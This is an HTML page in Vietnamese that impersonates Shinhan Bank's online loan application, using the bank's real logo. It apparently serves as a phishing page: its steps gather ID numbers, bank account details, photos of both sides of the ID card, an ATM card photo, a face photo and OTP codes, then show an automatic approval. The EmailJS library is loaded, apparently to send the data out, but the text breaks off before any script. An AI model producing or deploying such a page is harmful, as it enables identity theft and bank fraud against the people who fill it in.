<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Đăng ký vay tín chấp trực tuyến tại Shinhan Bank - nhanh chóng, tiện lợi, an toàn.">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <link rel="icon" href="https://shinhan.com.vn/public/themes/shinhan/img/favicon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f4f7fa;
            overflow-x: hidden;
        }
        .header {
            text-align: center;
            padding: 20px 0;
            background: linear-gradient(90deg, #003087, #00205B);
            color: white;
        }
        .header img {
            max-width: 200px;
        }
        .container {
            max-width: 800px;
            margin: 30px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .progress-bar-container {
            margin-bottom: 20px;
            position: relative;
        }
        .progress-bar {
            height: 30px;
            background: #e9ecef;
            border-radius: 15px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #003087, #0055a5);
            transition: width 0.5s ease-in-out;
        }
        .progress-label {
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #003087;
            font-weight: 500;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            max-width: 150px;
        }
        .step-title {
            font-size: 24px;
            font-weight: 700;
            color: #003087;
            text-align: center;
            margin-bottom: 20px;
        }
        .step-description {
            font-size: 16px;
            color: #6c757d;
            text-align: center;
            margin-bottom: 20px;
        }
        .step {
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .step.hidden {
            display: none;
            opacity: 0;
            transform: translateY(20px);
        }
        .form-control.is-invalid {
            border-color: #dc3545;
        }
        .btn-primary {
            background: linear-gradient(90deg, #003087, #0055a5);
            border: none;
            transition: all 0.3s ease;
            position: relative;
        }
        .btn-primary:hover {
            background: linear-gradient(90deg, #00205B, #003087);
            transform: scale(1.05);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .btn-primary .spinner-border {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .btn-primary.loading .spinner-border {
            display: inline-block;
        }
        .btn-primary.loading span {
            visibility: hidden;
        }
        .btn-back {
            background: #6c757d;
            border: none;
            transition: all 0.3s ease;
        }
        .btn-back:hover {
            background: #5a6268;
            transform: scale(1.05);
        }
        .footer {
            text-align: center;
            padding: 20px 0;
            background: linear-gradient(90deg, #003087, #00205B);
            color: white;
            margin-top: 30px;
        }
        .footer .lock-icon {
            width: 24px;
            vertical-align: middle;
        }
        .footer .footer-logo {
            max-width: 130px;
            margin-top: 10px;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .otp-digit {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            transition: border-color 0.3s ease;
        }
        .otp-digit:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .preview-section {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .preview-section img, .preview-section canvas {
            max-width: 200px;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            image-rendering: auto;
        }
        .preview-section canvas {
            width: 100%;
            max-width: 200px;
        }
        .confirmation-box {
            background-color: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
        }
        .canvas-container {
            position: relative;
            text-align: center;
        }
        canvas {
            max-width: 100%;
            height: auto;
        }
        canvas.loading::after {
            content: "Đang tải...";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #003087;
            font-size: 18px;
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1050;
        }
        .toast {
            min-width: 300px;
            animation: slideIn 0.3s ease;
        }
        .modal {
            animation: zoomIn 0.3s ease;
        }
        .modal-header img {
            width: 30px;
            margin-right: 10px;
        }
        .step7-preview {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .step7-preview img, .step7-preview canvas {
            max-width: 200px;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            image-rendering: auto;
        }
        .step7-preview canvas {
            width: 100%;
            max-width: 200px;
        }
        @media (max-width: 576px) {
            .container {
                margin: 10px;
                padding: 15px;
            }
            .form-logo img {
                max-width: 120px;
            }
            .otp-digit {
                width: 35px;
                height: 35px;
                font-size: 16px;
            }
            .preview-section img, .preview-section canvas {
                max-width: 150px;
            }
            .step7-preview img, .step7-preview canvas {
                max-width: 150px;
            }
            .btn-primary, .btn-back {
                padding: 8px 16px;
                font-size: 14px;
            }
            canvas {
                max-width: 100%;
            }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }
        @keyframes zoomIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.3s ease-in;
        }
    </style>
</head>
<body>
    <div class="toast-container">
        <div id="emailToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-autohide="true" data-bs-delay="5000">
            <div class="toast-header">
                <strong class="me-auto">Thông báo</strong>
                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body"></div>
        </div>
    </div>

    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/200x50?text=Logo+Shinhan'">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
            <div class="progress-label" id="progressLabel">Bước 1/10</div>
        </div>

        <!-- Bước 1: Đăng ký thông tin -->
        <div id="step1" class="step">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Thông Tin Đăng Ký</h5>
            <p class="step-description">Vui lòng điền đầy đủ thông tin để đăng ký vay tín chấp.</p>
            <form id="registerForm">
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên</label>
                    <input type="text" class="form-control" id="fullName" placeholder="Nguyễn Văn A">
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD/Hộ Chiếu</label>
                    <input type="text" class="form-control" id="idNumber" placeholder="123456789">
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD</label>
                    <input type="date" class="form-control" id="idIssueDate">
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD</label>
                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Cục Cảnh sát DKQL cư trú">
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ</label>
                    <input type="text" class="form-control" id="address" placeholder="123 Đường Lê Lợi, Quận 1, TP.HCM">
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
                    <select class="form-select" id="occupation">
                        <option value="" disabled selected>Chọn nghề nghiệp</option>
                        <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
                        <option value="Công nhân">Công nhân</option>
                        <option value="Kinh doanh tự do">Kinh doanh tự do</option>
                        <option value="Nội trợ">Nội trợ</option>
                        <option value="Khác">Khác</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND)</label>
                    <input type="text" class="form-control" id="income" placeholder="10,000,000">
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại</label>
                    <input type="tel" class="form-control" id="phoneNumber" placeholder="0901234567">
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="email" class="form-control" id="email" placeholder="example@domain.com">
                </div>
                <div class="mb-3">
                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND)</label>
                    <input type="text" class="form-control" id="loanAmount" placeholder="50,000,000">
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Kỳ Hạn Vay (Tháng)</label>
                    <select class="form-select" id="loanTerm">
                        <option value="" disabled selected>Chọn kỳ hạn</option>
                        <option value="12">12 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                        <option value="48">48 tháng</option>
                        <option value="60">60 tháng</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
                    <select class="form-select" id="loanPurpose">
                        <option value="" disabled selected>Chọn mục đích</option>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                        <option value="Mua xe">Mua xe</option>
                        <option value="Học tập">Học tập</option>
                        <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                        <option value="Đầu tư kinh doanh">Đầu tư kinh doanh</option>
                        <option value="Khác">Khác</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng</label>
                    <input type="text" class="form-control" id="accountNumber" placeholder="1234567890">
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng</label>
                    <select class="form-select" id="bankName">
                        <option value="" disabled selected>Chọn ngân hàng</option>
                        <option value="Agribank">Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)</option>
                        <option value="Vietcombank">Ngân hàng Ngoại thương Việt Nam (Vietcombank)</option>
                        <option value="VietinBank">Ngân hàng Công Thương Việt Nam (VietinBank)</option>
                        <option value="BIDV">Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)</option>
                        <option value="Techcombank">Ngân hàng Kỹ Thương Việt Nam (Techcombank)</option>
                        <option value="MB Bank">Ngân hàng Quân đội (MB Bank)</option>
                        <option value="VPBank">Ngân hàng Việt Nam Thịnh Vượng (VPBank)</option>
                        <option value="Sacombank">Ngân hàng Sài Gòn Thương Tín (Sacombank)</option>
                        <option value="ACB">Ngân hàng Á Châu (ACB)</option>
                        <option value="HDBank">Ngân hàng Phát triển TP.HCM (HDBank)</option>
                        <option value="TPBank">Ngân hàng Tiên Phong (TPBank)</option>
                        <option value="VIB">Ngân hàng Quốc tế (VIB)</option>
                        <option value="SHB">Ngân hàng Sài Gòn - Hà Nội (SHB)</option>
                        <option value="Eximbank">Ngân hàng Xuất Nhập khẩu Việt Nam (Eximbank)</option>
                        <option value="LienVietPostBank">Ngân hàng Bưu điện Liên Việt (LienVietPostBank)</option>
                        <option value="MSB">Ngân hàng Hàng Hải (MSB)</option>
                        <option value="OCB">Ngân hàng Phương Đông (OCB)</option>
                        <option value="SeABank">Ngân hàng Đông Nam Á (SeABank)</option>
                        <option value="Nam A Bank">Ngân hàng Nam Á (Nam A Bank)</option>
                        <option value="Kienlongbank">Ngân hàng Kiên Long (Kienlongbank)</option>
                        <option value="VietBank">Ngân hàng Việt Nam Thương Tín (VietBank)</option>
                        <option value="BaoViet Bank">Ngân hàng Bảo Việt (BaoViet Bank)</option>
                        <option value="PGBank">Ngân hàng Xăng dầu Petrolimex (PGBank)</option>
                        <option value="Viet A Bank">Ngân hàng Việt Á (Viet A Bank)</option>
                        <option value="NCB">Ngân hàng Quốc Dân (NCB)</option>
                        <option value="ABBank">Ngân hàng An Bình (ABBank)</option>
                        <option value="Bac A Bank">Ngân hàng Bắc Á (Bac A Bank)</option>
                        <option value="Saigonbank">Ngân hàng Sài Gòn Công Thương (Saigonbank)</option>
                        <option value="Viet Capital Bank">Ngân hàng Bản Việt (Viet Capital Bank)</option>
                        <option value="Shinhan Bank">Ngân hàng Shinhan Việt Nam (Shinhan Bank)</option>
                        <option value="HSBC">Ngân hàng HSBC Việt Nam</option>
                        <option value="Standard Chartered">Ngân hàng Standard Chartered Việt Nam</option>
                        <option value="Citibank">Ngân hàng Citibank Việt Nam</option>
                        <option value="ANZ">Ngân hàng ANZ Việt Nam</option>
                        <option value="UOB">Ngân hàng United Overseas Bank (UOB)</option>
                        <option value="CIMB">Ngân hàng CIMB Việt Nam</option>
                        <option value="Public Bank">Ngân hàng Public Bank Việt Nam</option>
                        <option value="Hong Leong Bank">Ngân hàng Hong Leong Việt Nam</option>
                        <option value="Woori Bank">Ngân hàng Woori Việt Nam</option>
                        <option value="KEB Hana Bank">Ngân hàng KEB Hana Việt Nam</option>
                        <option value="NongHyup Bank">Ngân hàng NongHyup Việt Nam</option>
                        <option value="Khác">Khác</option>
                    </select>
                </div>
                <div class="mb-3">
                    <label for="creditHistory" class="form-label">Lịch Sử Tín Dụng</label>
                    <select class="form-select" id="creditHistory">
                        <option value="" disabled selected>Chọn trạng thái</option>
                        <option value="Không có nợ xấu">Không có nợ xấu</option>
                        <option value="Có nợ xấu">Có nợ xấu</option>
                    </select>
                </div>
                <div class="mb-3 form-check">
                    <input type="checkbox" class="form-check-input" id="termsAgree">
                    <label class="form-check-label" for="termsAgree">Tôi đồng ý với <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">điều khoản và điều kiện</a></label>
                </div>
                <div class="text-center">
                    <button type="submit" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên giấy tờ">
                        <span>Tiếp Tục</span>
                        <div class="spinner-border spinner-border-sm" role="status"></div>
                    </button>
                </div>
            </form>
        </div>

        <!-- Bước 2: Tải lên CMND/CCCD -->
        <div id="step2" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Giấy Tờ Tùy Thân</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh mặt trước và mặt sau của CMND/CCCD (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="idFrontImage" class="form-label">Hình Ảnh Mặt Trước CMND/CCCD <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="idFrontImage" accept="image/jpeg,image/png" required aria-describedby="idFrontImageFeedback">
                <div id="idFrontImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt trước.</div>
                <small id="idFrontInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="mb-3">
                <label for="idBackImage" class="form-label">Hình Ảnh Mặt Sau CMND/CCCD <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="idBackImage" accept="image/jpeg,image/png" required aria-describedby="idBackImageFeedback">
                <div id="idBackImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt sau.</div>
                <small id="idBackInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(2, 1, 10)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa thông tin">Quay Lại</button>
                <button id="proceedToStep3Btn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên thẻ ATM">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 3: Tải lên thẻ ATM -->
        <div id="step3" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Thẻ ATM</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh thẻ ATM của bạn (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="atmImage" class="form-label">Hình Ảnh Thẻ ATM <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="atmImage" accept="image/jpeg,image/png" required aria-describedby="atmImageFeedback">
                <div id="atmImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh thẻ ATM.</div>
                <small id="atmImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(3, 2, 20)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa giấy tờ tùy thân">Quay Lại</button>
                <button id="proceedToStep4Btn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên ảnh khuôn mặt">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 4: Tải lên ảnh khuôn mặt -->
        <div id="step4" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Ảnh Khuôn Mặt</h5>
            <p class="step-description">Vui lòng tải lên ảnh khuôn mặt rõ nét của bạn để xác minh danh tính (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="faceImage" class="form-label">Hình Ảnh Khuôn Mặt <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="faceImage" accept="image/jpeg,image/png" required aria-describedby="faceImageFeedback">
                <div id="faceImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh khuôn mặt.</div>
                <small id="faceImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
            </div>
            <div class="preview-section">
                <h6>Xem Trước Hình Ảnh</h6>
                <div id="profileImagePreview">
                    <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                </div>
                <div id="contractImagePreview">
                    <p>Hình ảnh hợp đồng: Chưa có</p>
                </div>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(4, 3, 30)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa thẻ ATM">Quay Lại</button>
                <button id="proceedToOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước xác minh OTP">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 5: Xác minh OTP -->
        <div id="step5" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Xác Minh OTP</h5>
            <p class="step-description">Mã OTP đã được gửi đến số điện thoại của bạn. Mã có hiệu lực trong 5 phút.</p>
            <div class="text-center mb-3">
                <p>Mã OTP: <span id="otpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copyOtp()">Sao chép</button></p>
                <p><button type="button" class="btn btn-link" onclick="resendOtp()">Gửi lại OTP</button></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-digit form-control" id="otp1" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp2" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp3" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp4" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp5" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp6" maxlength="1" required>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(5, 4, 40)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa ảnh khuôn mặt">Quay Lại</button>
                <button id="verifyOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xác minh OTP để duyệt hồ sơ">
                    <span>Xác Minh</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 7: Hồ sơ được duyệt -->
        <div id="step7" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hồ Sơ Được Duyệt</h5>
            <p class="step-description">Chúc mừng! Hồ sơ vay tín chấp của bạn đã được duyệt.</p>
            <div class="confirmation-box">
                <p id="confirmationMessage"></p>
                <p>Thông tin chi tiết đã được gửi đến email: <span id="confirmationEmail"></span></p>
            </div>
            <div class="step7-preview">
                <h6>Xem trước tài liệu</h6>
                <div id="step7ProfileImagePreview">
                    <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                </div>
                <div id="step7ContractCanvasContainer">
                    <canvas id="step7ContractCanvas"></canvas>
                </div>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(7, 5, 50)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa OTP">Quay Lại</button>
                <button id="proceedToContractBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xem hợp đồng vay">
                    <span>Xem Hợp Đồng</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 8: Xem hợp đồng -->
        <div id="step8" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Xem Hợp Đồng</h5>
            <p class="step-description">Vui lòng xem kỹ hợp đồng trước khi ký. Hợp đồng bao gồm các điều khoản pháp lý và nghĩa vụ thanh toán.</p>
            <div class="canvas-container">
                <canvas id="contractCanvas"></canvas>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(8, 7, 70)" data-bs-toggle="tooltip" title="Quay lại để xem hồ sơ duyệt">Quay Lại</button>
                <button id="proceedToSignContractBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiến hành ký hợp đồng">
                    <span>Ký Hợp Đồng</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 8.1: Ký hợp đồng -->
        <div id="step8-1" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Ký Hợp Đồng</h5>
            <p class="step-description">Nhập mã OTP để xác nhận ký hợp đồng. Mã OTP có hiệu lực trong 5 phút.</p>
            <div class="text-center mb-3">
                <p>Mã OTP: <span id="signOtpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copySignOtp()">Sao chép</button></p>
                <p><button type="button" class="btn btn-link" onclick="resendSignOtp()">Gửi lại OTP</button></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-digit form-control" id="signOtp1" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp2" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp3" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp4" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp5" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp6" maxlength="1" required>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack('8-1', 8, 80)" data-bs-toggle="tooltip" title="Quay lại để xem hợp đồng">Quay Lại</button>
                <button id="verifySignOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xác nhận ký hợp đồng">
                    <span>Xác Nhận</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 9: Điều kiện giải ngân -->
        <div id="step9" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
            <p class="step-description">Vui lòng kiểm tra thông tin giải ngân và đảm bảo đáp ứng các điều kiện dưới đây.</p>
            <div class="confirmation-box">
                <h6>Điều Kiện Giải Ngân</h6>
                <ul>
                    <li>Hồ sơ vay đã được ký hợp đồng đầy đủ và hợp lệ.</li>
                    <li>Tài khoản ngân hàng nhận giải ngân phải khớp với thông tin đăng ký.</li>
                    <li>Không có thay đổi về tình trạng nợ xấu kể từ khi đăng ký.</li>
                    <li>Thời gian giải ngân dự kiến: Trong vòng 1-3 ngày làm việc sau khi ký hợp đồng.</li>
                </ul>
                <p><strong>Lưu ý:</strong> Số tiền giải ngân sẽ được chuyển vào tài khoản: <span id="disbursementAccount"></span></p>
            </div>
            <div class="canvas-container">
                <canvas id="disbursementCanvas"></canvas>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(9, '8-1', 85)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa OTP ký hợp đồng">Quay Lại</button>
                <button id="proceedToFinalStepBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Hoàn tất đăng ký vay">
                    <span>Hoàn Tất</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 10: Hoàn tất -->
        <div id="step10" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hoàn Tất</h5>
            <p class="step-description">Đăng ký vay tín chấp của bạn đã hoàn tất! Số tiền vay sẽ được giải ngân trong vòng 1-3 ngày làm việc.</p>
            <div class="text-center">
                <img src="https://media.giphy.com/media/3o7TKtnb4wIvS0rQ4o/giphy.gif" alt="Congratulations" style="max-width: 200px;" onerror="this.src='https://via.placeholder.com/200x200?text=Hoan+Tat'">
                <p class="mt-3">Cảm ơn bạn đã tin tưởng Shinhan Bank!</p>
            </div>
        </div>

        <!-- Modal Điều khoản -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <h6>1. Điều Kiện Vay</h6>
                        <table class="table table-bordered">
                            <tr><td>Độ tuổi</td><td>20 - 60 tuổi</td></tr>
                            <tr><td>Thu nhập tối thiểu</td><td>8 triệu VND/tháng</td></tr>
                            <tr><td>Lịch sử tín dụng</td><td>Không có nợ xấu tại thời điểm đăng ký</td></tr>
                            <tr><td>Kỳ hạn vay</td><td>12 - 60 tháng</td></tr>
                        </table>
                        <h6>2. Cam Kết Bảo Mật</h6>
                        <p>Chúng tôi cam kết bảo mật thông tin cá nhân của khách hàng theo quy định pháp luật Việt Nam.</p>
                        <h6>3. Trách Nhiệm Của Khách Hàng</h6>
                        <p>Khách hàng chịu trách nhiệm cung cấp thông tin chính xác và đầy đủ. Mọi sai sót có thể ảnh hưởng đến quá trình duyệt hồ sơ và giải ngân.</p>
                        <h6>4. Phí và Lãi Suất</h6>
                        <p>Lãi suất vay dao động từ 10% - 12%/năm, tùy thuộc vào số tiền vay. Có thể áp dụng phí phạt trả nợ trước hạn (2% - 5% số dư nợ).</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal Thành công -->
        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="successModalLabel">Chúc Mừng!</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Hồ sơ vay tín chấp của bạn đã được duyệt thành công!</p>
                        <p id="modalFullName"></p>
                        <p id="modalLoanAmount"></p>
                        <p id="modalLoanCode"></p>
